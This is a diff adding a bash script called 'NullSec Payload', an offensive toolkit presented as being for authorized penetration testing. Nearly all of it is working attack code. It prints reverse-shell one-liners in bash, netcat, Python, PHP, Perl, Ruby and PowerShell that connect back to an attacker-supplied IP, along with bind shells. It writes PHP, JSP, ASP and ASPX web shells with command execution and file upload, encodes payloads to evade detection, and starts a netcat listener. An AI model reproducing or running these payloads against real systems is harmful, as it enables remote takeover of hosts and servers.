@@ -1,0 +1,355 @@
+#!/bin/bash
+# ============================================================================
+# NullSec Payload - Payload Generation & Encoding
+# ============================================================================
+# Generate encoded payloads for penetration testing
+# Licensed under NullSec Public License v1.0
+# ============================================================================
+
+VERSION="1.0.0"
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
+
+OUTPUT_DIR="$HOME/.local/share/nullsec/payloads"
+mkdir -p "$OUTPUT_DIR"
+
+info() { echo -e "${CYAN}[*]${NC} $1"; }
+success() { echo -e "${GREEN}[✓]${NC} $1"; }
+warn() { echo -e "${YELLOW}[!]${NC} $1"; }
+error() { echo -e "${RED}[✗]${NC} $1"; }
+
+# Base64 encode
+encode_base64() {
+    local input="$1"
+    echo -n "$input" | base64
+}
+
+# Base64 decode
+decode_base64() {
+    local input="$1"
+    echo -n "$input" | base64 -d
+}
+
+# URL encode
+encode_url() {
+    local input="$1"
+    python3 -c "import urllib.parse; print(urllib.parse.quote('$input'))" 2>/dev/null || \
+    echo -n "$input" | xxd -p | sed 's/\(..\)/%\1/g'
+}
+
+# Hex encode
+encode_hex() {
+    local input="$1"
+    echo -n "$input" | xxd -p | tr -d '\n'
+}
+
+# Hex decode
+decode_hex() {
+    local input="$1"
+    echo -n "$input" | xxd -r -p
+}
+
+# ROT13
+encode_rot13() {
+    local input="$1"
+    echo -n "$input" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+}
+
+# XOR encode
+encode_xor() {
+    local input="$1"
+    local key="${2:-42}"
+    
+    echo -n "$input" | while IFS= read -r -n1 char; do
+        printf '%02x' "$(($(printf '%d' "'$char") ^ key))"
+    done
+}
+
+# Reverse shell payloads
+gen_reverse_shell() {
+    local ip="$1"
+    local port="${2:-4444}"
+    local type="${3:-bash}"
+    
+    [[ -z "$ip" ]] && { error "IP address required"; return 1; }
+    
+    echo -e "\n${CYAN}${BOLD}═══ Reverse Shell Payloads ═══${NC}"
+    echo -e "${WHITE}Target: $ip:$port${NC}\n"
+    
+    case "$type" in
+        bash|all)
+            echo -e "${GREEN}Bash:${NC}"
+            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
+            echo ""
+            echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+            echo ""
+            ;;&
+        nc|netcat|all)
+            echo -e "${GREEN}Netcat:${NC}"
+            echo "nc -e /bin/bash $ip $port"
+            echo ""
+            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
+            echo ""
+            ;;&
+        python|py|all)
+            echo -e "${GREEN}Python:${NC}"
+            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+            echo ""
+            echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
+            echo ""
+            ;;&
+        php|all)
+            echo -e "${GREEN}PHP:${NC}"
+            echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            echo ""
+            ;;&
+        perl|all)
+            echo -e "${GREEN}Perl:${NC}"
+            echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+            echo ""
+            ;;&
+        ruby|all)
+            echo -e "${GREEN}Ruby:${NC}"
+            echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+            echo ""
+            ;;&
+        powershell|ps|all)
+            echo -e "${GREEN}PowerShell:${NC}"
+            echo "\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+            echo ""
+            ;;
+    esac
+}
+
+# Bind shell payloads
+gen_bind_shell() {
+    local port="${1:-4444}"
+    
+    echo -e "\n${CYAN}${BOLD}═══ Bind Shell Payloads ═══${NC}"
+    echo -e "${WHITE}Port: $port${NC}\n"
+    
+    echo -e "${GREEN}Netcat:${NC}"
+    echo "nc -lvnp $port -e /bin/bash"
+    echo ""
+    
+    echo -e "${GREEN}Python:${NC}"
+    echo "python -c 'import socket,os;s=socket.socket();s.bind((\"\", $port));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(\"/bin/sh -i\")'"
+    echo ""
+    
+    echo -e "${GREEN}Perl:${NC}"
+    echo "perl -e 'use Socket;\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");'"
+    echo ""
+}
+
+# Web shells
+gen_webshell() {
+    local type="${1:-php}"
+    local output="$OUTPUT_DIR/webshell.$type"
+    
+    case "$type" in
+        php)
+            cat > "$output" << 'PHP'
+<?php
+// NullSec PHP Web Shell
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+}
+if(isset($_REQUEST['upload']) && isset($_FILES['file'])){
+    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+    echo "Uploaded: " . $_FILES['file']['name'];
+}
+?>
+<form method="POST">
+<input name="cmd" size="50" placeholder="Command">
+<button>Run</button>
+</form>
+<form method="POST" enctype="multipart/form-data">
+<input type="file" name="file">
+<input type="hidden" name="upload" value="1">
+<button>Upload</button>
+</form>
+PHP
+            ;;
+        jsp)
+            cat > "$output" << 'JSP'
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null) {
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while((line = br.readLine()) != null) out.println(line + "<br>");
+}
+%>
+<form method="GET"><input name="cmd"><button>Run</button></form>
+JSP
+            ;;
+        asp)
+            cat > "$output" << 'ASP'
+<%@ Language=VBScript %>
+<%
+Dim cmd
+cmd = Request("cmd")
+If cmd <> "" Then
+    Set shell = Server.CreateObject("WScript.Shell")
+    Set exec = shell.Exec("cmd /c " & cmd)
+    Response.Write("<pre>" & exec.StdOut.ReadAll & "</pre>")
+End If
+%>
+<form method="GET"><input name="cmd"><button>Run</button></form>
+ASP
+            ;;
+        aspx)
+            cat > "$output" << 'ASPX'
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+protected void Page_Load(object sender, EventArgs e) {
+    string cmd = Request["cmd"];
+    if(!String.IsNullOrEmpty(cmd)) {
+        Process p = new Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c " + cmd;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.UseShellExecute = false;
+        p.Start();
+        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+    }
+}
+</script>
+<form method="GET"><input name="cmd"><button>Run</button></form>
+ASPX
+            ;;
+    esac
+    
+    success "Generated: $output"
+}
+
+# Encode payload
+encode_payload() {
+    local payload="$1"
+    local encoding="${2:-base64}"
+    
+    [[ -z "$payload" ]] && { error "Payload required"; return 1; }
+    
+    echo -e "\n${CYAN}Original:${NC}"
+    echo "$payload"
+    echo ""
+    
+    case "$encoding" in
+        base64|b64)
+            echo -e "${GREEN}Base64:${NC}"
+            encode_base64 "$payload"
+            ;;
+        hex)
+            echo -e "${GREEN}Hex:${NC}"
+            encode_hex "$payload"
+            ;;
+        url)
+            echo -e "${GREEN}URL Encoded:${NC}"
+            encode_url "$payload"
+            ;;
+        rot13)
+            echo -e "${GREEN}ROT13:${NC}"
+            encode_rot13 "$payload"
+            ;;
+        xor)
+            echo -e "${GREEN}XOR (key=42):${NC}"
+            encode_xor "$payload" 42
+            ;;
+        all)
+            echo -e "${GREEN}Base64:${NC}"
+            encode_base64 "$payload"
+            echo ""
+            echo -e "${GREEN}Hex:${NC}"
+            encode_hex "$payload"
+            echo ""
+            echo -e "${GREEN}URL:${NC}"
+            encode_url "$payload"
+            echo ""
+            echo -e "${GREEN}ROT13:${NC}"
+            encode_rot13 "$payload"
+            ;;
+    esac
+    echo ""
+}
+
+# Listener
+start_listener() {
+    local port="${1:-4444}"
+    
+    info "Starting listener on port $port..."
+    info "Waiting for incoming connection (Ctrl+C to stop)"
+    echo ""
+    
+    if command -v rlwrap &>/dev/null; then
+        rlwrap nc -lvnp "$port"
+    else
+        nc -lvnp "$port"
+    fi
+}
+
+# Help
+show_help() {
+    cat << 'HELP'
+NullSec Payload - Payload Generation & Encoding
+
+⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️
+
+USAGE:
+    nullsec-payload <command> [options]
+
+COMMANDS:
+    reverse <ip> [port] [type]    Generate reverse shell
+    bind [port]                   Generate bind shell
+    webshell <type>               Generate web shell (php/jsp/asp/aspx)
+    encode <payload> [encoding]   Encode payload
+    decode <data> [encoding]      Decode data
+    listen [port]                 Start netcat listener
+
+ENCODING TYPES:
+    base64, hex, url, rot13, xor, all
+
+SHELL TYPES:
+    bash, nc, python, php, perl, ruby, powershell, all
+
+EXAMPLES:
+    nullsec-payload reverse 10.10.10.10 4444 all
+    nullsec-payload bind 9999
+    nullsec-payload webshell php
+    nullsec-payload encode "whoami" base64
+    nullsec-payload listen 4444
+
+OUTPUT:
+    Web shells saved to: ~/.local/share/nullsec/payloads/
+
+LICENSE:
+    NullSec Public License v1.0
+HELP
+}
+
+# Main
+case "$1" in
+    -h|--help|help|"") show_help ;;
+    reverse|rev|rs) shift; gen_reverse_shell "$@" ;;
+    bind|bs) shift; gen_bind_shell "$@" ;;
+    webshell|web|ws) shift; gen_webshell "$@" ;;
+    encode|enc) shift; encode_payload "$@" ;;
+    decode|dec)
+        shift
+        case "$2" in
+            base64|b64) decode_base64 "$1" ;;
+            hex) decode_hex "$1" ;;
+            *) decode_base64 "$1" ;;
+        esac
+        ;;
+    listen|listener|nc) shift; start_listener "$@" ;;
+    *) error "Unknown command: $1"; show_help; exit 1 ;;
+esac
